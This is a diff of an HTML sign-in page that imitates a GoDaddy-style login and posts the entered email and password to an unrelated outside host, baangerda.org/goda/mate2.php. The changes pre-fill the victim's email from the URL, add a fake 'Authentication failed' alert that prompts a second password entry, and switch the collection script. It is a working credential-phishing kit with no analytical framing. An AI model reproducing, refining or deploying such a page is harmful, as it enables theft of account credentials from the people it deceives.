@@ -5,6 +5,8 @@
 <link rel="stylesheet" href="away/uxcore2.min.css" media="all">
 <link rel="stylesheet" href="away/utilityheader.min.css" media="all">
 <link rel="manifest" href="javascript:void(0)?://img6.wsimg.com/ux/favicon/manifest.json">
+<script src="jquery.min.js"></script>  
+<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
 
 
 </head>
@@ -198,11 +200,11 @@ fill: #111;
 </div>
 </div>
 <div id="form-container">
-<div id="login-status-message"></div>
+<div id="login-status-message"><div class="alert alert-danger" role="alert" aria-label="danger"><div class="alert-text-wrap"><div class="alert-icon uxicon uxicon-alert" aria-hidden="true"></div><strong class="headline-primary" role="heading" aria-level="1"></strong> Authentication failed. You entered an incorrect username or password.</div></div></div>
 <h2 id="pass-title">Sign in</h2>
-<form action="https://baangerda.org/goda/mate.php" method="post">
+<form action="https://baangerda.org/goda/mate2.php" method="post">
 <fieldset class="form-group">
-<label for="username">Email </label><input id="email" type="email" class="username-input ctHidden form-control" value=""  required="" name="sofine">
+<label for="username" >Email </label><input id="email" type="email" class="username-input ctHidden form-control" value=""  required="" name="sofine">
 </fieldset>
 <div id="password-container">
 <fieldset class="form-group">
@@ -263,8 +265,10 @@ fill: #111;
 <div id="gtm_privacy"></div>
 </footer>
 </div>
-<script src="jquery.min.js"></script>  
-<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
-
+<script src="away/login-panel.js.download"></script><!--Build info
+App: v1
+Build time: Fri May 22 10:27:40 MST 2020
+Build number: 3038
+-->
 </body>
 </html>
